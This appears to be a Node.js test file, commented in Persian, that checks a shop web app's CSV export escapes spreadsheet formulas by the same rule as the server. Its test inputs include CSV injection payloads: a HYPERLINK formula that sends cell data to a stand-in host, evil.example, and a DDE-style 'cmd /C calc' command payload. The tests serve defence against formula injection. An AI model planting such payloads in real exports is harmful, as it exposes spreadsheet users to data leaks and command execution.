'use strict';
/**
 * R10 (بازبینیِ دومِ دستهٔ ۴۴) — خانهٔ CSV ِ نسخهٔ وبِ دکان (`license/csv-cell.js`) همان قاعدهٔ سرور (`finance-reports.cell`)، بی مرورگر.
 * (دانلودِ واقعیِ هر چهار خروجیِ صفحه در کرومیوم: `test/web-csv-export.mjs`.)
 *
 *   ⛔ متنِ آغازشده با `=` `+` `-` `@` تب یا CR ⇒ «'» پیشش (OWASP)؛ عدد (typeof number) همان عدد، منفی هم؛ null/undefined ⇒ خالی.
 *   ⛔ مقدارِ هر خانه پس از خواندنِ CSV با سرور یکی است؛ تنها فرقِ متن: `;` ِ پیشینِ صفحه هم نقل‌قول می‌شود.
 *   ⛔ بارکننده `shop-sync.js`، سرویس‌ورکر، index.html ِ یخ‌زده دست‌نخورده و `downloadCsv` ِ صفحه همان `csvCell` ِ سراسری را می‌خواند.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ROOT = path.join(__dirname, '..', '..');
const read = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
const W = require('../../license/csv-cell.js');
const { cell: server } = require('../src/lib/finance-reports');
const src = read('license/csv-cell.js');

/** یک خانهٔ CSV ⇐ مقدار (همان خواندنِ اکسل: نقل‌قول و «""») */
const unquote = (s) => (s.startsWith('"') ? s.slice(1, -1).replace(/""/g, '"') : s);

const INPUTS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"کلیک")', '=1+1', '+SUM(1,2)', '-2+3', "@SUM(1+1)*cmd|' /C calc'!A0", '\t=1+1', '\r=1+1',
  '-500', '-', '+', '=', '@', "'=1", ' =1', 'چای سبز', 'a,b', 'a"b', 'a\nb', 'a\r\nb', 'a;b', '=a;b', '', '0', '1e5',
  -500, 500, 0, -0, 12.5, -0.25, NaN, true, false, null, undefined, 1234567890123,
];

test('هر خانه همان مقدارِ سرور است (فرمول ⇒ «\'»، عدد همان عدد)', () => {
  for (const v of INPUTS) assert.equal(unquote(W.cell(v)), unquote(server(v)), JSON.stringify(v));
  //  متنِ خروجی هم یکی است، جز `;` که صفحه از پیش نقل‌قول می‌کرد
  for (const v of INPUTS.filter((x) => !String(x).includes(';'))) assert.equal(W.cell(v), server(v), JSON.stringify(v));
});

test('فرمول بسته، عددِ منفی عدد، متنِ عادی دست‌نخورده', () => {
  assert.equal(W.cell('=HYPERLINK("http://evil.example/","x")'), '"\'=HYPERLINK(""http://evil.example/"",""x"")"');
  assert.equal(W.cell('+SUM(1,2)'), '"\'+SUM(1,2)"');
  assert.equal(W.cell('@cmd'), "'@cmd");
  assert.equal(W.cell('-2+3'), "'-2+3");
  assert.equal(W.cell('\t=1'), "'\t=1");
  assert.equal(W.cell('\r=1'), '"\'\r=1"');
  assert.equal(W.cell(-500), '-500', 'عددِ منفی (ستونِ مبلغ) عدد می‌ماند');
  assert.equal(W.cell('-500'), "'-500", 'متنِ عددنما همان قاعدهٔ سرور');
  assert.equal(W.cell('چای سبز'), 'چای سبز');
  assert.equal(W.cell('a;b'), '"a;b"', 'نقل‌قولِ `;` ِ پیشینِ صفحه می‌ماند');
  assert.equal(W.cell(null), '');
  assert.equal(W.cell(undefined), '');
  for (const v of INPUTS) assert.ok(!/^[=+\-@\t\r]/.test(unquote(W.cell(v))) || typeof v === 'number', JSON.stringify(v));
});

test('نصب: `csvCell` ِ سراسری ⇐ `cell`؛ بی آن (Node، صفحهٔ دیگر) هیچ', () => {
  assert.equal(W.install(), false, 'در Node `csvCell` نیست');
  const vm = require('node:vm');
  const ctx = vm.createContext({ window: null });
  ctx.window = ctx;
  vm.runInContext('function csvCell(v){ return String(v); } function downloadCsv(rows){ return rows.map(r=> r.map(csvCell).join(",")).join("\\n"); }', ctx);
  vm.runInContext(src, ctx);
  assert.equal(typeof ctx.TohidCsvCell, 'object');
  assert.equal(ctx.downloadCsv([['=1+1', -5, 'نام']]), "'=1+1,-5,نام", '`downloadCsv` ِ صفحه همان `csvCell` ِ تازه را می‌خواند');
  assert.equal(ctx.TohidCsvCell.install(), true, 'دوباره ⇒ همان');
});

test('بارکننده و سرویس‌ورکر؛ index.html ِ یخ‌زده دست‌نخورده و `csvCell` ِ آن هنوز تنها سازندهٔ CSV است؛ بی innerHTML/eval', () => {
  assert.match(read('license/shop-sync.js'), /src: 'license\/csv-cell\.js\?v=1'/);
  assert.ok(read('sw.js').includes("'./license/csv-cell.js'"), 'نصبِ آفلاین هم پرونده را دارد');
  const html = read('index.html');
  assert.ok(!html.includes('csv-cell'), 'index.html یخ‌زده است: بارکننده shop-sync.js');
  //  `csvCell` اعلانِ تابعِ سراسری است (ویژگیِ نوشتنیِ window) و `downloadCsv` فقط از راهِ آن می‌نویسد
  assert.match(html, /\n {2}function csvCell\(v\)\{/);
  assert.match(html, /rows\.map\(r=> r\.map\(csvCell\)\.join\(','\)\)/);
  assert.equal((html.match(/type: ?'text\/csv/g) || []).length, 1, 'سازندهٔ CSV ِ دیگری در صفحه نیست');
  for (const f of fs.readdirSync(path.join(ROOT, 'license')).filter((x) => x.endsWith('.js') && x !== 'csv-cell.js')) {
    assert.ok(!/type: ?'text\/csv/.test(read(`license/${f}`)), `license/${f}: CSV ِ دوم بی همین قاعده`);
  }
  for (const [bad, re] of [['eval', /\beval\s*\(/], ['new Function', /new\s+Function\s*\(/], ['innerHTML', /\.(?:inner|outer)HTML\s*=|insertAdjacentHTML/]]) {
    assert.ok(!re.test(src), bad);
  }
});
